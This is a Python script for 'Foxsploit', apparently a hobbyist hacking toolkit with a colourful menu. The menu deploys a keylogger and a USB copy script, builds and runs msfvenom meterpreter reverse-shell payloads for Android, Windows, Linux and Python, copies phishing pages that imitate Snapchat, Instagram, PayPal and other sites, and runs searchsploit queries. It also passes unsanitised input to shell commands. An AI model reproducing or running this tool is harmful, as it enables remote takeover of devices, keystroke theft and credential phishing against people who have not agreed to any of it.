import urllib
import webbrowser
from os import system
from time import sleep
from colorama import Fore, Back, Style
from urllib.request import urlopen
"""///"""
def is_internet():
	try:
		urlopen('https://www.google.com', timeout=1)
		return True
		
	except urllib.error.URLError as Error:
		print(Error)
		return False
if is_internet():
	print("Internet is actived")
else:
	quit("Internet is disconnected\nPlease turn on you're WiFi")
sleep(0.7)
"""///"""
system("clear")
print(Fore.RED)
system("clear")
print("[|] Tanks for using Foxsploit !")
sleep(0.3)
system("clear")
print("[/] Tanks for using Foxsploit !")
sleep(0.3)
system("clear")
print("[-] Tanks for using Foxsploit !")
sleep(0.3)
system("clear")
print("[\] Tanks for using Foxsploit !")
sleep(0.3)
system("clear")
print("[|] Tanks for using Foxsploit !")
sleep(0.3)
system("clear")
print(Fore.GREEN + " _____                   _       _ _   ")
print("|  ___|____  _____ _ __ | | ___ (_) |_ ")
print("| |_ / _ \ \/ / __| '_ \| |/ _ \| | __|")
print("|  _| (_) >  <\__ \ |_) | | (_) | | |_ ")
print("|_|  \___/_/\_\___/ .__/|_|\___/|_|\__|")
print("                  |_|                  ")
print(Fore.YELLOW + " /\  /\   salty ?        ")
print(Fore.YELLOW + "//\\_//\\        ____   ",Fore.GREEN + "[",Fore.RED + "--------------------------------------",Fore.GREEN + "]")
print(Fore.YELLOW + "\_     _/    /   /    ",Fore.GREEN + "[",Fore.RED + "--",Fore.GREEN + "]",Fore.WHITE + "       Foxsploit            ",Fore.GREEN + "[",Fore.RED+ "--",Fore.GREEN + "]")
print(Fore.YELLOW + " / * * \    /^^^]     ",Fore.GREEN + "[",Fore.RED + "--",Fore.GREEN + "]",Fore.WHITE + " Multi tools framworks      ",Fore.GREEN + "[",Fore.RED+ "--",Fore.GREEN + "]")
print(Fore.YELLOW + " \_\O/_/    [   ]     ",Fore.GREEN + "[",Fore.RED + "--",Fore.GREEN + "]",Fore.WHITE + "  Created by: Lonk666       ",Fore.GREEN + "[",Fore.RED+ "--",Fore.GREEN + "]")
print(Fore.YELLOW + "  /   \_    [   /     ",Fore.GREEN + "[",Fore.RED + "--",Fore.GREEN + "]",Fore.WHITE + "      Version: 1.0          ",Fore.GREEN + "[",Fore.RED+ "--",Fore.GREEN + "]")
print(Fore.YELLOW + "  \     \_  /  /      ",Fore.GREEN + "[",Fore.RED + "--",Fore.GREEN + "]",Fore.WHITE + " Follow me on Github: Lonk  ",Fore.GREEN + "[",Fore.RED+ "--",Fore.GREEN + "]")
print(Fore.YELLOW + "   [ [ /  \/ _/       ",Fore.GREEN + "[",Fore.RED + "--",Fore.GREEN + "]",Fore.WHITE + " SELECT AN OPTION TO BEGIN: ",Fore.GREEN + "[",Fore.RED+ "--",Fore.GREEN + "]")
print(Fore.YELLOW + "  _[ [ \  /_/         ",Fore.GREEN + "[",Fore.RED + "--------------------------------------",Fore.GREEN + "]") 
print(Fore.WHITE + "[",Fore.GREEN + "1",Fore.WHITE + "]",Fore.GREEN +"Keylogger")
print(Fore.WHITE + "[",Fore.GREEN + "2",Fore.WHITE + "]",Fore.GREEN +"USB Copy")
print(Fore.WHITE + "[",Fore.GREEN + "3",Fore.WHITE + "]",Fore.GREEN +"Msf Payload")
print(Fore.WHITE + "[",Fore.GREEN + "4",Fore.WHITE + "]",Fore.GREEN +"Phishing page")
print(Fore.WHITE + "[",Fore.GREEN + "5",Fore.WHITE + "]",Fore.GREEN +"SearchSploit")
print(Fore.WHITE + "[",Fore.GREEN + "6",Fore.WHITE + "]",Fore.GREEN +"Git Hub page\n")
print(" ┌─[",Fore.RED + "Tuxsploit",Fore.GREEN + "]──[",Fore.RED + "~",Fore.GREEN + "]─[",Fore.MAGENTA + "menu",Fore.GREEN + "]:")
select = input(Fore.GREEN + " └─────► ")
"""///"""
if select == "1":
	system("clear")
	system("figlet Keylogger")
	print("\n\n")
	print(Fore.YELLOW + "   _,-='\"-.__               /\_/\ ")
	print("   `-.}       `=._,.-==-._.,  @ @._,")
	print("      `-.__   _,-.   )       _,.-'")
	print("           `\"     G..m-\"^m`m' \n\n")
	print(Fore.GREEN + " ┌─[",Fore.RED + "Tuxsploit",Fore.GREEN + "]──[",Fore.RED + "~",Fore.GREEN + "]─[",Fore.MAGENTA + "Phishing",Fore.GREEN + "]:",Fore.WHITE + "Where you want save you're keylogger ?")
	ksave = input(Fore.GREEN + " └─────► ")
	system("cp wget/Keylogger/main.py {}".format(ksave))
	print(Fore.WHITE + "[",Fore.GREEN + "*",Fore.WHITE + "]",Fore.GREEN + "Download The Keylogger",Fore.WHITE + "[",Fore.GREEN + "*",Fore.WHITE + "]",Fore.WHITE+ "\n[",Fore.GREEN + "/",Fore.WHITE + "]",Fore.GREEN + "Please wait",Fore.WHITE + "[",Fore.GREEN + "/",Fore.WHITE + "]")
	s = input("Press any key for Valid")
"""///"""
if select == "2":
	system("clear")
	system("figlet USB COPY")
	print(Fore.YELLOW + "   _,-='\"-.__               /\_/\ ")
	print("   `-.}       `=._,.-==-._.,  @ @._,")
	print("      `-.__   _,-.   )       _,.-'")
	print("           `\"     G..m-\"^m`m' \n\n")
	print(Fore.GREEN + " ┌─[",Fore.RED + "Tuxsploit",Fore.GREEN + "]──[",Fore.RED + "~",Fore.GREEN + "]─[",Fore.MAGENTA + "USB COPY",Fore.GREEN + "]:",Fore.WHITE + "Where you want save you're copy.bat ?")
	xsave = input(Fore.GREEN + " └─────► ")
	print(Fore.WHITE + "[",Fore.GREEN + "*",Fore.WHITE + "]",Fore.GREEN + "Download The USB copy",Fore.WHITE + "[",Fore.GREEN + "*",Fore.WHITE + "]",Fore.WHITE+ "\n[",Fore.GREEN + "/",Fore.WHITE + "]",Fore.GREEN + "Please wait",Fore.WHITE + "[",Fore.GREEN + "/",Fore.WHITE + "]")
	system("cp wget/xcopy.bat {}".format(xsave))
"""///"""
if select == "3":
	system("clear")
	system("figlet MSF PAYLOAD")
	print(Fore.YELLOW + "   _,-='\"-.__               /\_/\ ")
	print("   `-.}       `=._,.-==-._.,  @ @._,")
	print("      `-.__   _,-.   )       _,.-'")
	print("           `\"     G..m-\"^m`m' \n\n")
	print(Fore.GREEN + " ┌─[",Fore.RED + "Tuxsploit",Fore.GREEN + "]──[",Fore.RED + "~",Fore.GREEN + "]─[",Fore.MAGENTA + "Msf Venom",Fore.GREEN + "]:",Fore.WHITE + " Select you're IP  ")
	ip = input(Fore.GREEN + " └─────► ")
	print(Fore.GREEN + " ┌─[",Fore.RED + "Tuxsploit",Fore.GREEN + "]──[",Fore.RED + "~",Fore.GREEN + "]─[",Fore.MAGENTA + "Msf Venom",Fore.GREEN + "]:",Fore.WHITE + " Select you're port")
	port = input(Fore.GREEN + " └─────► ")
	print(Fore.GREEN + " ┌─[",Fore.RED + "Tuxsploit",Fore.GREEN + "]──[",Fore.RED + "~",Fore.GREEN + "]─[",Fore.MAGENTA + "Msf Venom",Fore.GREEN + "]:",Fore.WHITE + " Select Where you want save you're payload ? ")
	save = input(Fore.GREEN + " └─────► ")
	print(Fore.GREEN + " ┌─[",Fore.RED + "Tuxsploit",Fore.GREEN + "]──[",Fore.RED + "~",Fore.GREEN + "]─[",Fore.MAGENTA + "Msf Venom",Fore.GREEN + "]:",Fore.WHITE + " Select name of you're payload ")
	name = input(Fore.GREEN + " └─────► ")
	print(Fore.WHITE + "[",Fore.RED + "-----------------------------------------------------------------------------",Fore.WHITE + "]")
	print(Fore.WHITE + "   [",Fore.GREEN + "1",Fore.WHITE + "]",Fore.GREEN + "Android")
	print(Fore.WHITE + "   [",Fore.GREEN + "2",Fore.WHITE + "]",Fore.GREEN + "Windows")
	print(Fore.WHITE + "   [",Fore.GREEN + "3",Fore.WHITE + "]",Fore.GREEN + "Linux")
	print(Fore.WHITE + "   [",Fore.GREEN + "4",Fore.WHITE + "]",Fore.GREEN + "Mac OS(Python)")
	print(Fore.GREEN + " ┌─[",Fore.RED + "Tuxsploit",Fore.GREEN + "]──[",Fore.RED + "~",Fore.GREEN + "]─[",Fore.MAGENTA + "Msf Venom",Fore.GREEN + "]:",Fore.WHITE + " Select the type of payload")
	msfs = input(Fore.GREEN + " └─────► ")
	if msfs == "1":
		a="msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} -f apk -o {}{}.apk".format(ip, port, save, name)
		print("  ───►", a)
	if msfs =="2":
		a="msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe -o {}{}.exe".format(ip, port, save, name)
		print("  ───►", a)
	if msfs =="3":
		a="msfvenom -p linux/meterpreter/reverse_tcp LHOST={} LPORT={} -f py -o {}{}.py".format(ip, port, save, name)
		print("  ───►", a)
	if msfs =="4":
		a="msfvenom -p python/meterpreter/reverse_tcp LHOST={} LPORT={} -f py -o {}{}.py".format(ip, port, save, name)
		print("  ───►", a)
		system(a)
"""///"""
if select =="4":
	system("clear")
	system("figlet Phishing Page")
	print(Fore.WHITE + "[",Fore.RED + "-----------------------------------------------------------------------------",Fore.WHITE + "]")
	print(Fore.GREEN + " ┌─[",Fore.RED + "Tuxsploit",Fore.GREEN + "]──[",Fore.RED + "~",Fore.GREEN + "]─[",Fore.MAGENTA + "Phishing",Fore.GREEN + "]:",Fore.WHITE + "Where you want save you're page ?")
	savep = input(Fore.GREEN + " └─────► ")
	print(Fore.WHITE + "   [",Fore.GREEN + "1",Fore.WHITE + "]",Fore.GREEN + "Snapchat")
	print(Fore.WHITE + "   [",Fore.GREEN + "2",Fore.WHITE + "]",Fore.GREEN + "Instagram")
	print(Fore.WHITE + "   [",Fore.GREEN + "3",Fore.WHITE + "]",Fore.GREEN + "Paypal")
	print(Fore.WHITE + "   [",Fore.GREEN + "4",Fore.WHITE + "]",Fore.GREEN + "Spotify")
	print(Fore.WHITE + "   [",Fore.GREEN + "5",Fore.WHITE + "]",Fore.GREEN + "Steam")
	print(Fore.WHITE + "   [",Fore.GREEN + "6",Fore.WHITE + "]",Fore.GREEN + "Twitter")
	print(Fore.GREEN + " ┌─[",Fore.RED + "Tuxsploit",Fore.GREEN + "]──[",Fore.RED + "~",Fore.GREEN + "]─[",Fore.MAGENTA + "Phishing",Fore.GREEN + "]:",Fore.WHITE + "select the Phishishing page")
	phish = input(Fore.GREEN + " └─────► ")
	if phish == "1":
		system("cp -r /root/Desktop/Foxsploit/wget/Phish/snapchat/ {}".format(savep))
	if phish == "2":
		system("cp -r /root/Desktop/Foxsploit/wget/Phish/instagram/ {}".format(savep))
	if phish == "3":
		system("cp -r /root/Desktop/Foxsploit/wget/Phish/paypal/ {}".format(savep))
	if phish == "4":
		system("cp -r /root/Desktop/Foxsploit/wget/Phish/spotify/ {}".format(savep))
	if phish == "5":
		system("cp -r /root/Desktop/Foxsploit/wget/Phish/steam/ {}".format(savep))
	if phish == "6":
		system("cp -r /root/Desktop/Foxsploit/wget/Phish/twitter/ {}".format(savep))
if select =="5":
	print(Fore.GREEN + " ┌─[",Fore.RED + "Tuxsploit",Fore.GREEN + "]──[",Fore.RED + "~",Fore.GREEN + "]─[",Fore.MAGENTA + "Searchsploit",Fore.GREEN + "]:",Fore.WHITE + " What do you want to Hack Today ? ")
	search = input(Fore.GREEN + " └─────► ")
	system("searchsploit {}".format(search))

if select =="6":
	webbrowser.open('http://example.com')
	print(";)")
